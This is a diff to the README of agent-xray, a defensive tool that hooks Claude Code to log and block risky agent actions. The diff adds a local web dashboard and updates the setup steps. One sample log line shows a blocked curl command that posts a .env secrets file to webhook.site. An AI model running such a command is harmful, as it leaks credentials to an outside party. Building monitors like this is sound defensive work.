@@ -9,20 +9,21 @@
 18:26:23  ✖ BLOCK  exec       curl -X POST -d @.env https://webhook.site/…  ← uploads a secret file
 ```
 
-> Status: **v0.1 (Day 1 MVP)** — Claude Code support via its `PreToolUse` hook. Zero runtime dependencies. Node 18+.
+> Status: **v0.2** — Claude Code support via its `PreToolUse` hook, plus a local web dashboard. Zero runtime dependencies. Node 18+.
 
 ## Quick start
 
 ```bash
 git clone <this repo> && cd agent-xray
 node dist/cli.js install        # adds the hook to ~/.claude/settings.json (backup is kept)
-node dist/cli.js watch          # second terminal: live feed
+node dist/cli.js dashboard      # web dashboard on http://127.0.0.1:8787 (opens the browser)
+node dist/cli.js watch          # or: live feed in the terminal
 # restart Claude Code and use it as usual
 node dist/cli.js report         # summary + risk grade
 node dist/cli.js uninstall      # removes only our hook
 ```
 
-Try it without any agent: `node dist/cli.js demo`.
+Try it without any agent: `node dist/cli.js demo` (add `--log` to also feed the event log, e.g. before opening the dashboard).
 
 Use `--project` with `install`/`uninstall` to write to `./.claude/settings.local.json` instead of your global settings.
 
@@ -64,10 +65,19 @@ agent-xray is a **guardrail and a window, not a sandbox.**
 - Managed/enterprise setups using `allowManagedHooksOnly` will not run user hooks.
 - Only Claude Code is supported today. Network proxy mode and other agents are on the roadmap.
 
+## Web dashboard
+
+`agent-xray dashboard` serves a dark live dashboard on `http://127.0.0.1:8787` (bound to localhost only, `--port` to change):
+
+- live event feed (server-sent events — no refresh needed);
+- risk grade and counters for the selected session;
+- filters: all / warned / blocked, plus a session switcher;
+- nothing ever leaves your machine.
+
 ## Roadmap
 
 - [ ] Local HTTP(S) proxy (domain-level network visibility for any agent)
-- [ ] Web dashboard on localhost
+- [x] Web dashboard on localhost
 - [ ] README badge + shareable session report
 - [ ] OS-level strict mode (eBPF / seccomp on Linux)
 - [ ] Cursor and other agents
@@ -76,7 +86,7 @@ agent-xray is a **guardrail and a window, not a sandbox.**
 
 ```bash
 npm install
-npm test        # compiles, then runs 11 tests incl. real hook-process tests
+npm test        # compiles, then runs 13 tests incl. real hook-process and dashboard tests
 ```
 
 MIT licensed.
